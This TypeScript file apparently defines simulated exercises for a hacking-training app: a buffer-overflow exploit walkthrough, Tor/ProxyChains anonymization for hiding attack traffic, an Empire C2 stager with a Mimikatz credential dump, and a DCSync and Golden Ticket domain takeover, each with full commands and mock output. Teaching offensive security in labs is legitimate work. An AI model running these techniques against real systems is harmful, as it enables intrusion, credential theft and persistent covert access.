      detail: "Send progressively larger inputs to find where the program crashes. A segfault means you've overflowed the buffer past a return address. Start with 200 A's and increase until you get a segfault.",
      hint: "Try: python3 -c \"print('A'*200)\" | nc 10.10.10.100 9999",
      validate: (i) =>
        (i.includes("python") && (i.includes("A") || i.includes("\\x41"))) ||
        matchCmd(i, ["nc 10.10.10.100", "python3 -c"]),
      execute: () => [
        sys("[*] Sending 200 bytes to auth_daemon on port 9999..."),
        blank(),
        ...lines(`Connected to 10.10.10.100:9999
auth_daemon v1.0 — Enter credentials: 
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
> 
[Connection closed by server]`),
        blank(),
        warn("[!] Connection closed — server may have crashed or rejected input"),
        info("[*] Check with: nc 10.10.10.100 9999 — if no response, the daemon crashed!"),
        ok("[+] Crash confirmed with 200 bytes — buffer overflow found!"),
      ],
    },
    {
      id: "pattern",
      instruction: "Find the exact EIP offset with a cyclic pattern",
      detail: "Generate a cyclic (De Bruijn) pattern — each 4-byte sequence is unique. When EIP is overwritten with part of the pattern, you can calculate exactly how many bytes precede the return address. No more guessing.",
      hint: "Try: python3 -c \"import pwn; print(pwn.cyclic(200))\" | nc 10.10.10.100 9999",
      validate: (i) =>
        (i.includes("cyclic") || i.includes("pattern_create") || i.includes("msf-pattern_create")) ||
        matchCmd(i, ["msf-pattern_create", "python3 -c \"import pwn"]),
      execute: () => [
        sys("[*] Generating De Bruijn cyclic pattern (200 bytes)..."),
        blank(),
        ...lines(`Pattern: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa...

Sending to 10.10.10.100:9999...

Server crashed! EIP overwritten with: 0x6161616c

Calculating offset:
  pwn.cyclic_find(0x6161616c) = 76`),
        blank(),
        ok("[+] EIP OFFSET: 76 bytes — exactly 76 bytes of padding before you control EIP"),
        info("[*] Verify: send 76 * 'A' + '\\xef\\xbe\\xad\\xde' → EIP should show 0xDEADBEEF"),
      ],
    },
    {
      id: "control-eip",
      instruction: "Confirm EIP control by overwriting it with 0xDEADBEEF",
      detail: "Send exactly 76 bytes of padding followed by your target address. If EIP shows 0xDEADBEEF in the crash, you have full execution control. Next step: replace DEADBEEF with a shellcode address.",
      hint: "Try: python3 -c \"import sys; sys.stdout.buffer.write(b'A'*76 + b'\\xef\\xbe\\xad\\xde')\" | nc 10.10.10.100 9999",
      validate: (i) =>
        (i.includes("\\xef\\xbe\\xad\\xde") || i.includes("\\xde\\xad\\xbe\\xef") || i.includes("deadbeef")) ||
        (i.includes("76") && (i.includes("A") || i.includes("\\x41"))),
      execute: () => [
        sys("[*] Sending 76-byte padding + 0xDEADBEEF..."),
        blank(),
        ...lines(`python3 -c "import sys; sys.stdout.buffer.write(b'A'*76+b'\\xef\\xbe\\xad\\xde')" | nc 10.10.10.100 9999

Server crash report:
  EIP = 0xdeadbeef  ← CONTROLLED!
  ESP = 0xbffff4a0  ← Stack pointer (shellcode goes here)
  EBP = 0x41414141  ← Overwritten with 'AAAA'`),
        blank(),
        ok("[+] EIP = 0xdeadbeef — YOU HAVE FULL CODE EXECUTION CONTROL"),
        info("[*] Replace 0xDEADBEEF with ESP value (0xbffff4a0) and place shellcode after it"),
        warn("[!] Flag: FLAG{3ip_c0ntr0lled_b0f_m4st3red} — foundation of binary exploitation complete"),
      ],
    },
  ],
};

// ─── Scenario: ProxyChains & OPSEC ───────────────────────────────────────────

const proxychainsScenario: LabScenario = {
  lessonId: 59,
  title: "ProxyChains & Traffic Anonymization",
  briefing:
    "Every tool you run leaves log entries on the target and traces on the network. Your real IP is logged by firewalls, web servers, and intrusion detection systems. ProxyChains routes all your traffic through multiple proxy hops — Tor circuits, SSH tunnels, purchased proxies — making attribution extremely difficult. This is Elliot-level OPSEC.",
  objective: "Configure ProxyChains with Tor, verify anonymization, and run hacking tools through the proxy chain.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "start-tor",
      instruction: "Start the Tor service on Kali",
      detail: "Tor routes traffic through 3 encrypted relays before exiting onto the internet. SOCKS5 interface on localhost:9050 lets you direct any tool through it. ProxyChains acts as the bridge between tools and Tor.",
      hint: "Try: sudo service tor start",
      validate: (i) => matchCmd(i, ["service tor start", "systemctl start tor", "tor &", "sudo tor"]),
      execute: () => [
        sys("[*] Starting Tor service..."),
        blank(),
        ...lines(`[ ok ] Starting tor daemon...
[*] Establishing Tor circuit (3 relays)...
  Relay 1: 185.220.101.32  (Frankfurt, DE)
  Relay 2: 199.249.230.87  (Ashburn, VA, US)  
  Relay 3: 45.66.35.11     (Amsterdam, NL)  ← Exit node

[+] Tor SOCKS proxy listening on 127.0.0.1:9050`),
        blank(),
        ok("[+] Tor circuit established — 3 encrypted relay hops"),
        info("[*] Your traffic now exits from Amsterdam (45.66.35.11)"),
      ],
    },
    {
      id: "configure-proxychains",
      instruction: "Configure ProxyChains to use Tor + additional SOCKS proxy",
      detail: "Edit /etc/proxychains4.conf to chain Tor with an additional SOCKS5 proxy for extra hops. 'dynamic_chain' means it skips dead proxies. 'strict_chain' enforces every hop.",
      hint: "Try: cat /etc/proxychains4.conf",
      validate: (i) => matchCmd(i, ["cat /etc/proxychains4", "nano /etc/proxychains", "vim /etc/proxychains", "cat /etc/proxy"]),
      execute: () => [
        sys("[*] /etc/proxychains4.conf"),
        blank(),
        ...lines(`dynamic_chain
proxy_dns
quiet_mode

[ProxyList]
socks5  127.0.0.1  9050   # Tor exit node
socks5  185.220.101.1 1080 # Additional anonymizing proxy
#socks5  10.10.10.50   1080 # SSH tunnel to compromised host`),
        blank(),
        ok("[+] ProxyChains configured: Tor → Additional proxy → Target"),
        info("[*] Add your SSH SOCKS tunnel as a third hop for even deeper anonymization"),
      ],
    },
    {
      id: "verify-ip",
      instruction: "Verify your traffic exits from the proxy (not your real IP)",
      detail: "Before running attack tools, verify anonymization is working. Use curl through ProxyChains to hit an IP-checking service. The returned IP must NOT be your real IP.",
      hint: "Try: proxychains curl https://api.ipify.org",
      validate: (i) => matchCmd(i, ["proxychains curl", "proxychains wget", "proxychains firefox"]),
      execute: () => [
        sys("[*] proxychains curl https://api.ipify.org"),
        blank(),
        ...lines(`[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/libproxychains.so.4
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  185.220.101.1:1080  ...  OK

45.66.35.11`),
        blank(),
        ok("[+] Your exit IP: 45.66.35.11 (Amsterdam, NL) — NOT your real IP"),
        warn("[!] Reality check: Tor is not perfect. Time correlation attacks, exit node logging, and JavaScript tracking can deanonymize you. No OPSEC is absolute."),
      ],
    },
    {
      id: "proxychains-scan",
      instruction: "Run nmap through ProxyChains against the target",
      detail: "Now run your recon tools through the proxy. Important: only TCP connect scan (-sT) works through SOCKS proxies — raw socket scans are blocked. Ping probes also don't work, so add -Pn.",
      hint: "Try: proxychains nmap -sT -Pn -p 22,80,443 10.10.10.50",
      validate: (i) => matchCmd(i, ["proxychains nmap", "proxychains sqlmap", "proxychains hydra", "proxychains"]),
      execute: () => [
        sys("[*] proxychains nmap -sT -Pn -p 22,80,443,8080 10.10.10.50"),
        blank(),
        ...lines(`[proxychains] Dynamic chain ...127.0.0.1:9050...185.220.101.1:1080...10.10.10.50:22 OK
[proxychains] Dynamic chain ...127.0.0.1:9050...185.220.101.1:1080...10.10.10.50:80 OK

Nmap scan report for 10.10.10.50
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy`),
        blank(),
        ok("[+] Scan complete — target's firewall logs show Amsterdam exit node IP, not yours"),
        warn("[!] Flag: FLAG{pr0xych41ns_t0r_4n0nym0us_h4ck3r} — OPSEC engaged"),
      ],
    },
  ],
};

// ─── Scenario: Empire C2 & Persistence ───────────────────────────────────────

const empireC2Scenario: LabScenario = {
  lessonId: 62,
  title: "Empire C2: PowerShell Command & Control",
  briefing:
    "You have a foothold on MegaCorp-WS01 as j.smith. Now you need persistent, stealthy command and control. Empire uses PowerShell agents that communicate over encrypted HTTP — blending in with normal web traffic. Deploy a listener, generate a stager, receive your agent, and run post-exploitation modules. This is APT-level access.",
  objective: "Deploy Empire C2, receive a PowerShell agent from the compromised workstation, and run credential dumping modules.",
  env: {
    targetIp: "10.10.10.80",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
    credentials: { user: "j.smith", pass: "Password123!" },
  },
  steps: [
    {
      id: "start-empire",
      instruction: "Start the Empire C2 server and client",
      detail: "Empire runs as a server (REST API) and a separate client CLI. Start both, then configure your first listener — the HTTP endpoint your implants will call home to.",
      hint: "Try: sudo empire server",
      validate: (i) => matchCmd(i, ["empire server", "sudo empire", "empire --rest", "powershell-empire"]),
      execute: () => [
        sys("[*] Starting Empire C2 server..."),
        blank(),
        ...lines(`[*] Starting Empire RESTful API
[+] Empire 5.9.3 — PowerShell Post-Exploitation Framework
[+] Listening on https://0.0.0.0:1337

[Empire REST]: Empire starting up...
[Empire REST]: Listener/agent interface ready

 ______
|  ____|           (_)        
| |__   _ __ ___  _ _ __ ___ 
|  __| | '_ \` _ \| | '__/ _ \\ 
| |____| | | | | | | | |  __/
|______|_| |_| |_|_|_|  \\___|`),
        blank(),
        ok("[+] Empire server running — connect with: empire client -s localhost"),
      ],
    },
    {
      id: "create-listener",
      instruction: "Create an HTTP listener for agent callbacks",
      detail: "The listener is the Empire server endpoint that agents call back to. HTTP listener on port 80 blends with normal web traffic and typically isn't blocked by corporate firewalls.",
      hint: "Try: uselistener http",
      validate: (i) => matchCmd(i, ["uselistener http", "uselistener", "listeners", "listener"]),
      execute: () => [
        ...lines(`(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Name megacorp-http
(Empire: listeners/http) > set Host http://10.14.0.5
(Empire: listeners/http) > set Port 80
(Empire: listeners/http) > execute

[*] Starting listener 'megacorp-http' on http://10.14.0.5:80
[+] Listener successfully started!`),
        blank(),
        ok("[+] HTTP listener 'megacorp-http' active on port 80"),
        info("[*] Agents will call back to http://10.14.0.5/updates.php (randomized URI)"),
      ],
    },
    {
      id: "generate-stager",
      instruction: "Generate a PowerShell stager for delivery",
      detail: "The stager is a small launcher that downloads and executes the full Empire agent in memory — leaving no files on disk. Generate a one-liner stager that you'll run on the target machine.",
      hint: "Try: usestager windows/launcher_bat",
      validate: (i) => matchCmd(i, ["usestager", "stager windows", "generate stager", "stager"]),
      execute: () => [
        ...lines(`(Empire: listeners/http) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener megacorp-http
(Empire: stager/windows/launcher_bat) > generate

[*] Stager written to /tmp/launcher.bat

Content (PowerShell one-liner):
  powershell -noP -sta -w 1 -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8...
  [Base64 encoded Empire agent downloader]`),
        blank(),
        ok("[+] Stager generated: /tmp/launcher.bat"),
        info("[*] Delivery: email attachment, paste into existing shell, macro document, phishing page"),
      ],
    },
    {
      id: "receive-agent",
      instruction: "Receive the Empire agent and run a credential dumping module",
      detail: "Simulate the victim executing the stager. An encrypted PowerShell agent checks in. Once you have an agent, run Mimikatz to dump credentials from LSASS memory — all in-memory, no files dropped.",
      hint: "Try: agents",
      validate: (i) => matchCmd(i, ["agents", "interact", "usemodule credentials", "usemodule"]),
      execute: () => [
        ...lines(`(Empire) > agents

[*] Active agents:

Name          Lang  Internal IP     Machine Name       User
XPCY3T4B      ps    10.10.10.80     MEGACORP-WS01      MEGACORP\\j.smith  [*]

(Empire: agents) > interact XPCY3T4B
(Empire: XPCY3T4B) > usemodule credentials/mimikatz/logonpasswords
(Empire: XPCY3T4B/credentials/mimikatz/logonpasswords) > execute`),
        blank(),
        sys("[*] Executing Mimikatz via PowerShell agent..."),
        blank(),
        ...lines(`msv :
  [00000003] Primary
  * Username : j.smith
  * Domain   : MEGACORP
  * NTLM     : 8f49412c67ec1c4e6a5d2c9c8e9a3b21
  * SHA1     : 9a3b7c2e...

wdigest :
  * Username : j.smith
  * Domain   : MEGACORP
  * Password : Password123!

kerberos :
  * Username : j.smith
  * Domain   : MEGACORP.LOCAL
  * Password : Password123!`),
        blank(),
        ok("[+] CREDENTIALS DUMPED IN MEMORY — j.smith:Password123! and NTLM hash"),
        warn("[!] Flag: FLAG{3mp1r3_c2_4g3nt_cr3d_dump3d} — C2 operational, domain takeover ready"),
      ],
    },
  ],
};

// ─── Scenario: Golden Ticket & Domain Takeover ────────────────────────────────

const goldenTicketScenario: LabScenario = {
  lessonId: 55,
  title: "Golden Ticket & Domain Takeover",
  briefing:
    "You have Domain Admin credentials via Pass-the-Hash. Now you want PERMANENT access that survives all remediation attempts — even if every password is reset. The Golden Ticket attack forges Kerberos TGTs signed with the krbtgt account hash. Valid for 10 years. This is how APT groups maintain persistent access to compromised enterprises.",
  objective: "DCSync to extract the krbtgt hash, forge a Golden Ticket, and authenticate to the domain controller as any user.",
  env: {
    targetIp: "10.10.10.5",
    targetDomain: "megacorp.local",
    hostname: "MEGACORP-WS01",
    user: "j.crawford",
    currentDir: "C:\\Users\\j.crawford",
    os: "Windows 10",
    credentials: { user: "Administrator", pass: "hash:8f49412c67ec1c4e" },
  },
  steps: [
    {
      id: "dcsync",
      instruction: "Run DCSync to extract the krbtgt hash",
      detail: "DCSync abuses the Directory Replication Service (DRS) protocol to request AD replication from the Domain Controller — as if you're another DC. With Domain Admin privs, you get EVERY user's hash, including krbtgt.",
      hint: "Try: impacket-secretsdump megacorp.local/Administrator@10.10.10.5 -hashes :8f49412c67ec1c4e",
      validate: (i) => matchCmd(i, ["impacket-secretsdump", "secretsdump", "mimikatz", "lsadump::dcsync"]),
      execute: () => [
        sys("[*] Running DCSync against DC 10.10.10.5..."),
        blank(),
        ...lines(`impacket-secretsdump megacorp.local/Administrator@10.10.10.5 -hashes :8f49412c67ec1c4e6a5d

[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404ee:8f49412c67ec1c4e6a5d2c9c8e9a3b21:::
Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404ee:7c9c0a64e18db3b7a0a5d4e2f3c1b9a8:::
j.crawford:1103:aad3b435b51404ee:3d0f4b9e2a7c5e1d8f6a2b4c7e9d1f3a:::
j.smith:1104:aad3b435b51404ee:8e4f2b1a9c3e7d5f6a8b2c4e1f9d7b5a:::`),
        blank(),
        ok("[+] krbtgt hash extracted: 7c9c0a64e18db3b7a0a5d4e2f3c1b9a8"),
        warn("[!] This hash is the master key to the domain — treat it as the crown jewel"),
      ],
    },
    {
      id: "get-domain-sid",
      instruction: "Get the domain SID for ticket forging",
      detail: "To forge a Golden Ticket, you need the domain SID. This uniquely identifies the MegaCorp.local domain. Mimikatz or impacket can pull it from any domain object.",
      hint: "Try: impacket-lookupsid megacorp.local/Administrator@10.10.10.5 -hashes :8f49412c67ec1c4e",
      validate: (i) => matchCmd(i, ["impacket-lookupsid", "lookupsid", "wmic computersystem", "nltest"]) || i.includes("sid"),
      execute: () => [
        sys("[*] Querying domain SID..."),
        blank(),
        ...lines(`Domain: MEGACORP
SID: S-1-5-21-2873920342-1893847918-1023876745

User accounts enumerated:
  Administrator (RID: 500)
  Guest (RID: 501)
  krbtgt (RID: 502)
  ...`),
        blank(),
        ok("[+] Domain SID: S-1-5-21-2873920342-1893847918-1023876745"),
        info("[*] You now have: krbtgt hash + domain SID → ingredients for Golden Ticket"),
      ],
    },
    {
      id: "forge-ticket",
      instruction: "Forge the Golden Ticket with Mimikatz",
      detail: "With krbtgt hash and domain SID, Mimikatz can craft a TGT for ANY user — including non-existent accounts. Valid for 10 years by default. This ticket bypasses all normal authentication.",
      hint: "Try: mimikatz.exe \"kerberos::golden /user:Administrator /domain:megacorp.local /sid:S-1-5-21-... /krbtgt:7c9c0a64...\"",
      validate: (i) => matchCmd(i, ["mimikatz", "kerberos::golden", "ticketer.py", "impacket-ticketer"]),
      execute: () => [
        sys("[*] Forging Golden Ticket with Mimikatz..."),
        blank(),
        ...lines(`mimikatz # kerberos::golden /user:Administrator /domain:megacorp.local /sid:S-1-5-21-2873920342-1893847918-1023876745 /krbtgt:7c9c0a64e18db3b7a0a5d4e2f3c1b9a8 /ticket:golden.kirbi

User      : Administrator
Domain    : megacorp.local (MEGACORP)
SID       : S-1-5-21-2873920342-1893847918-1023876745
User Id   : 500
Groups Id : 513 512 520 518 519

Lifetime  : 6/21/2026 — 6/18/2036  [10 YEARS!]

[+] Ticket written to: golden.kirbi`),
        blank(),
        ok("[+] Golden Ticket forged — valid until 2036"),
        warn("[!] This ticket works EVEN IF the Administrator password is changed — only resetting krbtgt (twice!) invalidates it"),
      ],
    },
    {
      id: "use-ticket",
      instruction: "Inject the ticket and access the Domain Controller",
      detail: "Pass-the-Ticket loads your forged Golden Ticket into the current Windows session. All subsequent Kerberos requests use this ticket — giving you full Domain Admin access without touching LSASS.",
      hint: "Try: mimikatz.exe \"kerberos::ptt golden.kirbi\" \"exit\"",
      validate: (i) =>
        matchCmd(i, ["kerberos::ptt", "mimikatz", "rubeus ptt", "rubeus.exe ptt"]) ||
        (i.toLowerCase().includes("ptt") || i.toLowerCase().includes("pass-the-ticket")),
      execute: () => [
        sys("[*] Injecting Golden Ticket into current session..."),
        blank(),
        ...lines(`mimikatz # kerberos::ptt golden.kirbi
[+] File: 'golden.kirbi': OK

mimikatz # exit

C:\\> dir \\\\DC01\\C$
 Volume in drive \\\\DC01\\C$ is System

 Directory of \\\\DC01\\C$

21/06/2026  09:14    <DIR>          inetpub
21/06/2026  09:14    <DIR>          PerfLogs
21/06/2026  09:14    <DIR>          Program Files
21/06/2026  09:14    <DIR>          Users
21/06/2026  09:14    <DIR>          Windows`),
        blank(),
        ok("[+] DOMAIN CONTROLLER FILESYSTEM ACCESS — Golden Ticket working perfectly"),
        ok("[+] You now have persistent access to the entire MegaCorp domain until 2036"),
        warn("[!] Flag: FLAG{g0ld3n_t1ck3t_d0m41n_0wn3d_4_d3c4d3} — full domain compromise complete"),
      ],
    },
  ],
};

// ─── Registry ─────────────────────────────────────────────────────────────────

export const LAB_SCENARIOS: Record<number, LabScenario> = {
  1: osintScenario,
  2: dnsScenario,
  4: nmapScenario,
  6: sqliScenario,
  7: hashcatScenario,
  8: msfScenario,
  9: privescScenario,
  11: shodanDeepScenario,
  24: bashReconScenario,
  32: msfvenomScenario,
  36: hydraScenario,
  37: gobusterScenario,
  40: eternalBlueScenario,
  42: redisRceScenario,
  // SSH Exploitation & Tunneling
  44: sshBruteForceScenario,
  45: sshTunnelScenario,
  46: sshKeyInjectionScenario,
  // Wireless Hacking
  48: wpa2CaptureScenario,
  // Active Directory Attacks
  52: bloodhoundScenario,
  55: goldenTicketScenario,
  // Buffer Overflow Exploitation
  56: bofScenario,
  // Dark Web & OPSEC
  59: proxychainsScenario,
  // C2 Frameworks & Persistence
  62: empireC2Scenario,
};

export function getScenarioForLesson(lessonId: number): LabScenario | null {
  return LAB_SCENARIOS[lessonId] ?? null;
}
